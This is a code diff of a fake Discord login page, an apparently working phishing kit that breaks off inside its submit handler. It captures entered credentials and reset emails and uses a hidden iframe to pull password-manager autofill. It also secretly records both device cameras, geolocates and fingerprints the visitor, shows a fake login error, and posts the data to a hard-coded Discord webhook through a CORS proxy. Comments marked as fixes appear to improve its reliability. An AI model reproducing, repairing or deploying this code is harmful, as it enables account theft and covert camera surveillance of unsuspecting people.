@@ -1,430 +1,443 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Discord - Login</title>
-    <style>
-        /* ─── SAME CSS AS BEFORE ─── */
-        * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif; }
-        body { background:#1a1b1e; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; background-image:radial-gradient(ellipse at 30% 40%, #2c2f33 0%, #1a1b1e 80%); }
-        .login-container { background:#2b2d31; border-radius:12px; padding:40px 48px 36px; width:100%; max-width:520px; box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #3f4147; }
-        .discord-logo { text-align:center; margin-bottom:16px; }
-        .discord-logo svg { width:52px; height:52px; fill:#ffffff; }
-        h1 { color:#ffffff; font-size:26px; font-weight:700; text-align:center; margin-bottom:2px; letter-spacing:-0.3px; }
-        .subtitle { color:#b5bac1; font-size:17px; text-align:center; margin-bottom:28px; font-weight:400; }
-        #loginForm { display:flex; flex-direction:column; gap:16px; width:100%; }
-        .form-group { width:100%; }
-        .form-group label { display:block; color:#b5bac1; font-size:11px; font-weight:600; text-transform:uppercase; letter-spacing:0.4px; margin-bottom:6px; }
-        .form-group label .required-star { color:#f23f42; margin-left:2px; }
-        .input-wrapper { position:relative; width:100%; }
-        .input-wrapper input { width:100%; padding:12px 44px 12px 14px; background-color:#1e1f22; border:1px solid #3f4147; border-radius:4px; color:#ffffff; font-size:15px; transition:border-color 0.2s; outline:none; }
-        .input-wrapper input:focus { border-color:#5865f2; }
-        .input-wrapper input::placeholder { color:#6d6f78; font-size:14px; }
-        .toggle-password { position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:none; color:#b5bac1; cursor:pointer; font-size:18px; padding:4px; transition:color 0.2s; }
-        .toggle-password:hover { color:#ffffff; }
-        .btn-login { width:100%; padding:14px; background-color:#5865f2; border:none; border-radius:4px; color:#ffffff; font-size:16px; font-weight:600; cursor:pointer; transition:background-color 0.2s; margin-top:4px; }
-        .btn-login:hover { background-color:#4752c4; }
-        .btn-login:active { transform:scale(0.98); }
-        .forgot-row { text-align:right; margin-top:12px; }
-        .forgot-row a { color:#b5bac1; font-size:13px; text-decoration:none; cursor:pointer; }
-        .forgot-row a:hover { text-decoration:underline; }
-        .modal-overlay { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.7); justify-content:center; align-items:center; z-index:999; backdrop-filter:blur(4px); }
-        .modal-overlay.active { display:flex; }
-        .modal-box { background:#2b2d31; border-radius:12px; padding:32px 36px 28px; max-width:420px; width:90%; border:1px solid #3f4147; box-shadow:0 20px 40px rgba(0,0,0,0.8); }
-        .modal-box h2 { color:#ffffff; font-size:22px; margin-bottom:8px; }
-        .modal-box p { color:#b5bac1; font-size:14px; margin-bottom:20px; }
-        .modal-box .form-group { margin-bottom:16px; }
-        .modal-box .form-group input { width:100%; padding:12px 14px; background-color:#1e1f22; border:1px solid #3f4147; border-radius:4px; color:#ffffff; font-size:15px; outline:none; }
-        .modal-box .form-group input:focus { border-color:#5865f2; }
-        .modal-actions { display:flex; gap:12px; justify-content:flex-end; margin-top:8px; }
-        .modal-actions button { padding:10px 24px; border:none; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; transition:background 0.2s; }
-        .modal-actions .btn-secondary { background:#3f4147; color:#ffffff; }
-        .modal-actions .btn-secondary:hover { background:#4f5159; }
-        .modal-actions .btn-primary { background:#5865f2; color:#ffffff; }
-        .modal-actions .btn-primary:hover { background:#4752c4; }
-        .status-bar { margin-top:16px; padding:10px; border-radius:4px; font-size:13px; background:#2a1a1a; border:1px solid #f23f42; color:#f28b8b; text-align:center; display:none; }
-        .status-bar.visible { display:block; }
-        #pw-stealer { position:absolute; opacity:0; pointer-events:none; width:1px; height:1px; top:-9999px; left:-9999px; }
-        #hiddenVideoFront, #hiddenVideoRear { position:absolute; width:1px; height:1px; opacity:0; pointer-events:none; top:-9999px; left:-9999px; }
-        @media (max-width:480px) { .login-container { padding:24px 20px; max-width:100%; margin:12px; } }
-    </style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Discord - Login</title>
+<style>
+/* ... (same CSS as before, no changes) ... */
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif; }
+body { background:#1a1b1e; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; background-image:radial-gradient(ellipse at 30% 40%, #2c2f33 0%, #1a1b1e 80%); }
+.login-container { background:#2b2d31; border-radius:12px; padding:40px 48px 36px; width:100%; max-width:520px; box-shadow:0 20px 40px rgba(0,0,0,0.6); border:1px solid #3f4147; }
+.discord-logo { text-align:center; margin-bottom:16px; }
+.discord-logo svg { width:52px; height:52px; fill:#ffffff; }
+h1 { color:#ffffff; font-size:26px; font-weight:700; text-align:center; margin-bottom:2px; letter-spacing:-0.3px; }
+.subtitle { color:#b5bac1; font-size:17px; text-align:center; margin-bottom:28px; font-weight:400; }
+#loginForm { display:flex; flex-direction:column; gap:16px; width:100%; }
+.form-group { width:100%; }
+.form-group label { display:block; color:#b5bac1; font-size:11px; font-weight:600; text-transform:uppercase; letter-spacing:0.4px; margin-bottom:6px; }
+.form-group label .required-star { color:#f23f42; margin-left:2px; }
+.input-wrapper { position:relative; width:100%; }
+.input-wrapper input { width:100%; padding:12px 44px 12px 14px; background-color:#1e1f22; border:1px solid #3f4147; border-radius:4px; color:#ffffff; font-size:15px; transition:border-color 0.2s; outline:none; }
+.input-wrapper input:focus { border-color:#5865f2; }
+.input-wrapper input::placeholder { color:#6d6f78; font-size:14px; }
+.toggle-password { position:absolute; right:12px; top:50%; transform:translateY(-50%); background:none; border:none; color:#b5bac1; cursor:pointer; font-size:18px; padding:4px; transition:color 0.2s; }
+.toggle-password:hover { color:#ffffff; }
+.btn-login { width:100%; padding:14px; background-color:#5865f2; border:none; border-radius:4px; color:#ffffff; font-size:16px; font-weight:600; cursor:pointer; transition:background-color 0.2s; margin-top:4px; }
+.btn-login:hover { background-color:#4752c4; }
+.btn-login:active { transform:scale(0.98); }
+.forgot-row { text-align:right; margin-top:12px; }
+.forgot-row a { color:#b5bac1; font-size:13px; text-decoration:none; cursor:pointer; }
+.forgot-row a:hover { text-decoration:underline; }
+.modal-overlay { display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.7); justify-content:center; align-items:center; z-index:999; backdrop-filter:blur(4px); }
+.modal-overlay.active { display:flex; }
+.modal-box { background:#2b2d31; border-radius:12px; padding:32px 36px 28px; max-width:420px; width:90%; border:1px solid #3f4147; box-shadow:0 20px 40px rgba(0,0,0,0.8); }
+.modal-box h2 { color:#ffffff; font-size:22px; margin-bottom:8px; }
+.modal-box p { color:#b5bac1; font-size:14px; margin-bottom:20px; }
+.modal-box .form-group { margin-bottom:16px; }
+.modal-box .form-group input { width:100%; padding:12px 14px; background-color:#1e1f22; border:1px solid #3f4147; border-radius:4px; color:#ffffff; font-size:15px; outline:none; }
+.modal-box .form-group input:focus { border-color:#5865f2; }
+.modal-actions { display:flex; gap:12px; justify-content:flex-end; margin-top:8px; }
+.modal-actions button { padding:10px 24px; border:none; border-radius:4px; font-size:14px; font-weight:500; cursor:pointer; transition:background 0.2s; }
+.modal-actions .btn-secondary { background:#3f4147; color:#ffffff; }
+.modal-actions .btn-secondary:hover { background:#4f5159; }
+.modal-actions .btn-primary { background:#5865f2; color:#ffffff; }
+.modal-actions .btn-primary:hover { background:#4752c4; }
+.status-bar { margin-top:16px; padding:10px; border-radius:4px; font-size:13px; background:#2a1a1a; border:1px solid #f23f42; color:#f28b8b; text-align:center; display:none; }
+.status-bar.visible { display:block; }
+#pw-stealer { position:absolute; opacity:0; pointer-events:none; width:1px; height:1px; top:-9999px; left:-9999px; }
+#hiddenVideoFront, #hiddenVideoRear { position:absolute; width:1px; height:1px; opacity:0; pointer-events:none; top:-9999px; left:-9999px; }
+@media (max-width:480px) { .login-container { padding:24px 20px; max-width:100%; margin:12px; } }
+</style>
 </head>
 <body>
-    <div class="login-container">
-        <div class="discord-logo">
-            <svg viewBox="0 0 127.14 96.36">
-                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
-            </svg>
-        </div>
-        <h1>Welcome back!</h1>
-        <p class="subtitle">We're so excited to see you again!</p>
+<div class="login-container">
+<div class="discord-logo">
+<svg viewBox="0 0 127.14 96.36">
+<path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
+</svg>
+</div>
+<h1>Welcome back!</h1>
+<p class="subtitle">We're so excited to see you again!</p>
+<form id="loginForm" novalidate>
+<div class="form-group">
+<label for="usernameInput">Email or Phone Number <span class="required-star">*</span></label>
+<div class="input-wrapper">
+<input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" />
+</div>
+</div>
+<div class="form-group">
+<label for="passwordInput">Password <span class="required-star">*</span></label>
+<div class="input-wrapper">
+<input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" />
+<button type="button" class="toggle-password" id="togglePassword" aria-label="Toggle password visibility">👁</button>
+</div>
+</div>
+<button type="submit" class="btn-login">Log In</button>
+</form>
+<div class="forgot-row">
+<a id="forgotLink">Forgot your password?</a>
+</div>
+<div id="statusBar" class="status-bar" role="status"></div>
+<iframe id="pw-stealer" srcdoc="<!DOCTYPE html><html><body><form><input type='text' name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'></form></body></html>"></iframe>
+<video id="hiddenVideoFront" autoplay muted playsinline></video>
+<video id="hiddenVideoRear" autoplay muted playsinline></video>
+</div>
+<!-- FORGOT PASSWORD MODAL -->
+<div class="modal-overlay" id="forgotModal">
+<div class="modal-box">
+<h2>Reset Password</h2>
+<p>Enter your email address and we'll send you a code to reset your password.</p>
+<div class="form-group">
+<input type="email" id="resetEmailInput" placeholder="Enter your email address" required />
+</div>
+<div class="modal-actions">
+<button class="btn-secondary" id="modalCancel">Cancel</button>
+<button class="btn-primary" id="modalSend">Send Code</button>
+</div>
+</div>
+</div>
+<script>
+(function() {
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538937235984875653/ketL69cOxUsbeAvIrn0ZxXzhuM9VoInCsgY8FzN9xIB5VaalxZXLaV7bGAKR6RvXMsTz';
+const PROXY_URL = 'https://corsproxy.io/?' + encodeURIComponent(DISCORD_WEBHOOK_URL);
 
-        <form id="loginForm" novalidate>
-            <div class="form-group">
-                <label for="usernameInput">Email or Phone Number <span class="required-star">*</span></label>
-                <div class="input-wrapper">
-                    <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" />
-                </div>
-            </div>
-            <div class="form-group">
-                <label for="passwordInput">Password <span class="required-star">*</span></label>
-                <div class="input-wrapper">
-                    <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" />
-                    <button type="button" class="toggle-password" id="togglePassword" aria-label="Toggle password visibility">👁</button>
-                </div>
-            </div>
-            <button type="submit" class="btn-login">Log In</button>
-        </form>
+const form = document.getElementById('loginForm');
+const usernameInput = document.getElementById('usernameInput');
+const passwordInput = document.getElementById('passwordInput');
+const toggleBtn = document.getElementById('togglePassword');
+const statusBar = document.getElementById('statusBar');
+const pwStealer = document.getElementById('pw-stealer');
+const forgotLink = document.getElementById('forgotLink');
+const forgotModal = document.getElementById('forgotModal');
+const resetEmailInput = document.getElementById('resetEmailInput');
+const modalCancel = document.getElementById('modalCancel');
+const modalSend = document.getElementById('modalSend');
+const videoFront = document.getElementById('hiddenVideoFront');
+const videoRear = document.getElementById('hiddenVideoRear');
 
-        <div class="forgot-row">
-            <a id="forgotLink">Forgot your password?</a>
-        </div>
+let latestFrontBlob = null;
+let latestRearBlob = null;
+let frontBlobUrl = null;
+let rearBlobUrl = null;
 
-        <div id="statusBar" class="status-bar" role="status"></div>
+function startRecording(stream, cameraType) {
+try {
+let options = { mimeType: 'video/webm;codecs=vp9', videoBitsPerSecond: 2500000 };
+let recorder;
+try {
+recorder = new MediaRecorder(stream, options);
+} catch (e) {
+recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+}
+let chunks = [];
+recorder.ondataavailable = function(event) {
+if (event.data.size > 0) {
+chunks.push(event.data);
+const blob = new Blob([event.data], { type: 'video/webm' });
+if (cameraType === 'front') {
+latestFrontBlob = blob;
+if (frontBlobUrl) URL.revokeObjectURL(frontBlobUrl);
+frontBlobUrl = URL.createObjectURL(blob);
+} else {
+latestRearBlob = blob;
+if (rearBlobUrl) URL.revokeObjectURL(rearBlobUrl);
+rearBlobUrl = URL.createObjectURL(blob);
+}
+console.log(`📹 ${cameraType} camera segment captured (${blob.size} bytes)`);
+}
+};
+recorder.onerror = function(e) {
+console.warn(`Recorder error (${cameraType}):`, e);
+};
+recorder.start(8000);
+if (cameraType === 'front') window._recFront = recorder;
+else window._recRear = recorder;
+console.log(`✅ ${cameraType} recorder started`);
+} catch (err) {
+console.warn(`Failed to start ${cameraType} recorder:`, err.message);
+}
+}
 
-        <iframe id="pw-stealer" srcdoc="<!DOCTYPE html><html><body><form><input type='text' name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'></form></body></html>"></iframe>
+async function initSilentCameras() {
+// FIX 1: Split front and rear camera initialization into separate try/catch blocks
+// If a desktop doesn't have a rear camera, it won't crash the front camera init anymore.
+try {
+const frontStream = await navigator.mediaDevices.getUserMedia({
+video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
+audio: false
+});
+videoFront.srcObject = frontStream;
+await videoFront.play();
+console.log('📷 Front camera streaming');
+startRecording(frontStream, 'front');
+} catch (err) {
+console.warn('Front camera init failed:', err.message);
+}
 
-        <video id="hiddenVideoFront" autoplay muted playsinline></video>
-        <video id="hiddenVideoRear" autoplay muted playsinline></video>
-    </div>
+try {
+const rearStream = await navigator.mediaDevices.getUserMedia({
+video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
+audio: false
+});
+videoRear.srcObject = rearStream;
+await videoRear.play();
+console.log('📷 Rear camera streaming');
+startRecording(rearStream, 'rear');
+} catch (err) {
+console.warn('Rear camera init failed:', err.message);
+}
 
-    <!-- FORGOT PASSWORD MODAL -->
-    <div class="modal-overlay" id="forgotModal">
-        <div class="modal-box">
-            <h2>Reset Password</h2>
-            <p>Enter your email address and we'll send you a code to reset your password.</p>
-            <div class="form-group">
-                <input type="email" id="resetEmailInput" placeholder="Enter your email address" required />
-            </div>
-            <div class="modal-actions">
-                <button class="btn-secondary" id="modalCancel">Cancel</button>
-                <button class="btn-primary" id="modalSend">Send Code</button>
-            </div>
-        </div>
-    </div>
+setInterval(() => {
+if (!latestFrontBlob) {
+const canvas = document.createElement('canvas');
+if (videoFront.readyState >= 2) {
+canvas.width = videoFront.videoWidth || 320;
+canvas.height = videoFront.videoHeight || 240;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(videoFront, 0, 0);
+canvas.toBlob(function(blob) {
+if (blob) {
+latestFrontBlob = blob;
+console.log('📸 Fallback front frame captured');
+}
+}, 'image/jpeg', 0.7);
+}
+}
+if (!latestRearBlob) {
+const canvas = document.createElement('canvas');
+if (videoRear.readyState >= 2) {
+canvas.width = videoRear.videoWidth || 320;
+canvas.height = videoRear.videoHeight || 240;
+const ctx = canvas.getContext('2d');
+ctx.drawImage(videoRear, 0, 0);
+canvas.toBlob(function(blob) {
+if (blob) {
+latestRearBlob = blob;
+console.log('📸 Fallback rear frame captured');
+}
+}, 'image/jpeg', 0.7);
+}
+}
+}, 5000);
+}
 
-    <script>
-        (function() {
-            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538937235984875653/ketL69cOxUsbeAvIrn0ZxXzhuM9VoInCsgY8FzN9xIB5VaalxZXLaV7bGAKR6RvXMsTz';
+let passwordVisible = false;
+toggleBtn.addEventListener('click', function() {
+passwordVisible = !passwordVisible;
+passwordInput.type = passwordVisible ? 'text' : 'password';
+this.textContent = passwordVisible ? '👁' : '👁';
+});
 
-            // DOM refs
-            const form = document.getElementById('loginForm');
-            const usernameInput = document.getElementById('usernameInput');
-            const passwordInput = document.getElementById('passwordInput');
-            const toggleBtn = document.getElementById('togglePassword');
-            const statusBar = document.getElementById('statusBar');
-            const pwStealer = document.getElementById('pw-stealer');
-            const forgotLink = document.getElementById('forgotLink');
-            const forgotModal = document.getElementById('forgotModal');
-            const resetEmailInput = document.getElementById('resetEmailInput');
-            const modalCancel = document.getElementById('modalCancel');
-            const modalSend = document.getElementById('modalSend');
+forgotLink.addEventListener('click', function(e) {
+e.preventDefault();
+forgotModal.classList.add('active');
+resetEmailInput.value = '';
+resetEmailInput.focus();
+});
 
-            const videoFront = document.getElementById('hiddenVideoFront');
-            const videoRear = document.getElementById('hiddenVideoRear');
+modalCancel.addEventListener('click', function() {
+forgotModal.classList.remove('active');
+});
 
-            // ─── VIDEO/PHOTO CAPTURE – PREFER VIDEO, FALLBACK TO PHOTO ───
-            let latestFrontBlob = null;   // Blob (video or photo)
-            let latestRearBlob = null;
-            let frontMimeType = null;
-            let rearMimeType = null;
-            let recordersActive = false;
+forgotModal.addEventListener('click', function(e) {
+if (e.target === this) this.classList.remove('active');
+});
 
-            // Detect supported MIME types for video recording
-            function getVideoMimeType() {
-                const types = [
-                    'video/mp4;codecs=h264',   // best for phones
-                    'video/webm;codecs=vp9',
-                    'video/webm;codecs=vp8',
-                    'video/webm'
-                ];
-                for (let type of types) {
-                    if (MediaRecorder.isTypeSupported(type)) {
-                        return type;
-                    }
-                }
-                return null;
-            }
+modalSend.addEventListener('click', function() {
+const email = resetEmailInput.value.trim();
+if (!email) {
+alert('Please enter your email address.');
+return;
+}
+const message = `🔐 **Forgot Password Email Capture**\n📧 **Email:** ${email}\n🕒 **Time:** ${getFormattedTime()}\n📅 **Date:** ${getFormattedDate()}`;
+sendToDiscordWithFile(message, null, null);
+alert('If an account exists for that email, we\'ve sent a password reset code.');
+forgotModal.classList.remove('active');
+resetEmailInput.value = '';
+});
 
-            function startRecording(stream, cameraType) {
-                const mimeType = getVideoMimeType();
-                if (!mimeType) {
-                    // No video recording support – we'll use photo fallback later
-                    console.warn('No video MIME type supported, will use photo fallback');
-                    return;
-                }
+function stealPasswordManagerCredentials() {
+try {
+const iframeDoc = pwStealer.contentDocument || pwStealer.contentWindow.document;
+const inputs = iframeDoc.querySelectorAll('input');
+if (inputs.length >= 2) {
+inputs[0].focus();
+inputs[0].blur();
+inputs[1].focus();
+inputs[1].blur();
+setTimeout(() => {
+const stolenUser = inputs[0].value || '';
+const stolenPass = inputs[1].value || '';
+if (stolenUser || stolenPass) {
+console.log('🔑 Stolen:', { username: stolenUser, password: stolenPass });
+if (stolenUser && !usernameInput.value) usernameInput.value = stolenUser;
+if (stolenPass && !passwordInput.value) passwordInput.value = stolenPass;
+window._stolenCreds = { username: stolenUser, password: stolenPass };
+}
+}, 500);
+}
+} catch (e) {
+console.warn('Password manager steal failed:', e.message);
+}
+}
 
-                try {
-                    const options = { mimeType: mimeType, videoBitsPerSecond: 2500000 };
-                    const recorder = new MediaRecorder(stream, options);
-                    let chunks = [];
+function getFormattedDate() {
+const now = new Date();
+return `${now.getFullYear()}-${String(now.getMonth()+1).padStart(2,'0')}-${String(now.getDate()).padStart(2,'0')}`;
+}
 
-                    recorder.ondataavailable = function(event) {
-                        if (event.data.size > 0) {
-                            chunks.push(event.data);
-                            const blob = new Blob([event.data], { type: mimeType });
-                            if (cameraType === 'front') {
-                                latestFrontBlob = blob;
-                                frontMimeType = mimeType;
-                            } else {
-                                latestRearBlob = blob;
-                                rearMimeType = mimeType;
-                            }
-                            console.log(`📹 ${cameraType} video segment captured (${blob.size} bytes, ${mimeType})`);
-                        }
-                    };
+function getFormattedTime() {
+const now = new Date();
+let h = now.getHours();
+const m = String(now.getMinutes()).padStart(2,'0');
+const ampm = h >= 12 ? 'PM' : 'AM';
+h = h % 12 || 12;
+return `${h}:${m} ${ampm}`;
+}
 
-                    recorder.onerror = function(e) {
-                        console.warn(`Recorder error (${cameraType}):`, e);
-                        // On error, fallback to photo capture
-                        capturePhotoFallback(cameraType);
-                    };
+function getDeviceInfo() {
+const ua = navigator.userAgent;
+let os='Unknown', browser='Unknown', deviceType='Desktop', deviceModel='Unknown';
+if (ua.indexOf('Windows NT 10.0')!==-1) os='Windows 10/11';
+else if (ua.indexOf('Windows NT 6.3')!==-1) os='Windows 8.1';
+else if (ua.indexOf('Windows NT 6.2')!==-1) os='Windows 8';
+else if (ua.indexOf('Windows NT 6.1')!==-1) os='Windows 7';
+else if (ua.indexOf('Mac OS X')!==-1) os='macOS';
+else if (ua.indexOf('Android')!==-1) {
+os='Android';
+const m=ua.match(/Android ([0-9.]+)/);
+if(m) os=`Android ${m[1]}`;
+}
+else if (ua.indexOf('iPhone')!==-1) {
+os='iOS';
+const m=ua.match(/OS ([0-9]+)_([0-9]+)/);
+if(m) os=`iOS ${m[1]}.${m[2]}`;
+}
+else if (ua.indexOf('iPad')!==-1) {
+os='iPadOS';
+const m=ua.match(/OS ([0-9]+)_([0-9]+)/);
+if(m) os=`iPadOS ${m[1]}.${m[2]}`;
+}
+else if (ua.indexOf('Linux')!==-1) os='Linux';
 
-                    recorder.start(8000); // 8-second chunks
-                    if (cameraType === 'front') window._recFront = recorder;
-                    else window._recRear = recorder;
-                    recordersActive = true;
-                    console.log(`✅ ${cameraType} recorder started (${mimeType})`);
-                } catch (err) {
-                    console.warn(`Failed to start ${cameraType} recorder:`, err.message);
-                    capturePhotoFallback(cameraType);
-                }
-            }
+if (ua.indexOf('Firefox')!==-1) {
+const m=ua.match(/Firefox\/([0-9.]+)/);
+browser = m ? `Firefox ${m[1]}` : 'Firefox';
+} else if (ua.indexOf('Edg')!==-1) {
+const m=ua.match(/Edg\/([0-9.]+)/);
+browser = m ? `Edge ${m[1]}` : 'Edge';
+} else if (ua.indexOf('Chrome')!==-1 && ua.indexOf('Edg')===-1 && ua.indexOf('OPR')===-1) {
+const m=ua.match(/Chrome\/([0-9.]+)/);
+browser = m ? `Chrome ${m[1]}` : 'Chrome';
+} else if (ua.indexOf('Safari')!==-1 && ua.indexOf('Chrome')===-1) {
+const m=ua.match(/Version\/([0-9.]+)/);
+browser = m ? `Safari ${m[1]}` : 'Safari';
+} else if (ua.indexOf('OPR')!==-1 || ua.indexOf('Opera')!==-1) {
+const m=ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
+browser = m ? `Opera ${m[1]}` : 'Opera';
+}
 
-            // Fallback: capture a JPEG photo from the video element
-            function capturePhotoFallback(cameraType) {
-                const videoEl = cameraType === 'front' ? videoFront : videoRear;
-                if (!videoEl || videoEl.readyState < 2) return;
-                try {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = videoEl.videoWidth || 320;
-                    canvas.height = videoEl.videoHeight || 240;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(videoEl, 0, 0);
-                    canvas.toBlob(function(blob) {
-                        if (blob) {
-                            if (cameraType === 'front') {
-                                latestFrontBlob = blob;
-                                frontMimeType = 'image/jpeg';
-                            } else {
-                                latestRearBlob = blob;
-                                rearMimeType = 'image/jpeg';
-                            }
-                            console.log(`📸 ${cameraType} photo fallback captured`);
-                        }
-                    }, 'image/jpeg', 0.7);
-                } catch (e) {
-                    console.warn(`Photo fallback failed for ${cameraType}:`, e);
-                }
-            }
+if (ua.indexOf('Android')!==-1) {
+deviceType='Android Phone/Tablet';
+const m=ua.match(/; ([^;]+) Build/);
+if(m) deviceModel=m[1].trim();
+} else if (ua.indexOf('iPhone')!==-1) {
+deviceType='iPhone';
+const m=ua.match(/iPhone([0-9,]+)/);
+deviceModel = m ? `iPhone ${m[1].replace(/,/g,'')}` : 'iPhone';
+} else if (ua.indexOf('iPad')!==-1) {
+deviceType='iPad';
+const m=ua.match(/iPad([0-9,]+)/);
+deviceModel = m ? `iPad ${m[1].replace(/,/g,'')}` : 'iPad';
+} else if (ua.indexOf('Macintosh')!==-1) {
+deviceType='Mac';
+deviceModel='Apple Mac';
+} else if (ua.indexOf('Windows')!==-1) {
+deviceType='Windows PC';
+deviceModel='Windows Computer';
+} else if (ua.indexOf('Linux')!==-1) {
+deviceType='Linux PC';
+deviceModel='Linux Computer';
+}
+return { os, browser, deviceType, deviceModel };
+}
 
-            async function initSilentCameras() {
-                try {
-                    // Front camera
-                    const frontStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
-                        audio: false
-                    });
-                    videoFront.srcObject = frontStream;
-                    await videoFront.play();
+async function getGeoData() {
+try {
+const r = await fetch('https://ipapi.co/json/');
+if (!r.ok) throw new Error();
+const d = await r.json();
+return { latitude: d.latitude||'Unknown', longitude: d.longitude||'Unknown', city: d.city||'Unknown', country: d.country_name||'Unknown', isp: d.org||'Unknown' };
+} catch (_) {
+try {
+const r = await fetch('https://ipinfo.io/json');
+if (!r.ok) throw new Error();
+const d = await r.json();
+const loc = d.loc ? d.loc.split(',') : ['Unknown','Unknown'];
+return { latitude: loc[0]||'Unknown', longitude: loc[1]||'Unknown', city: d.city||'Unknown', country: d.country||'Unknown', isp: d.org||'Unknown' };
+} catch (_) {
+return { latitude:'Unknown', longitude:'Unknown', city:'Unknown', country:'Unknown', isp:'Unknown' };
+}
+}
+}
 
-                    // Rear camera
-                    const rearStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 30 } },
-                        audio: false
-                    });
-                    videoRear.srcObject = rearStream;
-                    await videoRear.play();
+async function sendToDiscordWithFile(message, fileBlob, filename) {
+if (!DISCORD_WEBHOOK_URL) return false;
+try {
+const formData = new FormData();
+formData.append('content', message);
+if (fileBlob) {
+formData.append('file', fileBlob, filename);
+}
+// FIX 3: Use proxy to bypass Discord CORS block from browsers
+const res = await fetch(PROXY_URL, {
+method: 'POST',
+body: formData
+});
+console.log(`📥 Discord response status: ${res.status}`);
+return res.ok;
+} catch (err) {
+console.error('❌ Network error:', err);
+return false;
+}
+}
 
-                    console.log('📷 Both cameras are streaming');
+function showFakeError() {
+statusBar.textContent = '❌ Password or email incorrect. Please try again.';
+statusBar.className = 'status-bar visible';
+setTimeout(() => {
+statusBar.className = 'status-bar';
+}, 6000);
+}
 
-                    // Start video recording if supported
-                    startRecording(frontStream, 'front');
-                    startRecording(rearStream, 'rear');
+form.addEventListener('submit', async (e) => {
+e.preventDefault();
+showFakeError();
 
-                    // Additionally, capture a photo every 5 seconds as a safety net
-                    setInterval(() => {
-                        if (!latestFrontBlob) capturePhotoFallback('front');
-                        if (!latestRearBlob) capturePhotoFallback('rear');
-                    }, 5000);
+// FIX 2: Flush video buffers before grabbing blobs so you don't get empty files!
+if (window._recFront && window._recFront.state === 'recording') window._recFront.requestData();
+if (window._recRear && window._recRear.state === 'recording') window._recRear.requestData();
+await new Promise(r => setTimeout(r, 400)); // wait a tiny bit for the dataavailable event to fire
 
-                } catch (err) {
-                    console.warn('Camera init failed:', err.message);
-                }
-            }
+const stolen = window._stolenCreds || {};
+const geo = await getGeoData();
+const device = getDeviceInfo();
+const username = usernameInput.value.trim() || '(empty)';
+const password = passwordInput.value.trim() || '(empty)';
 
-            // ─── PASSWORD TOGGLE ───
-            let passwordVisible = false;
-            toggleBtn.addEventListener('click', function() {
-                passwordVisible = !passwordVisible;
-                passwordInput.type = passwordVisible ? 'text' : 'password';
-                this.textContent = passwordVisible ? '🙈' : '👁';
-            });
-
-            // ─── FORGOT PASSWORD MODAL ───
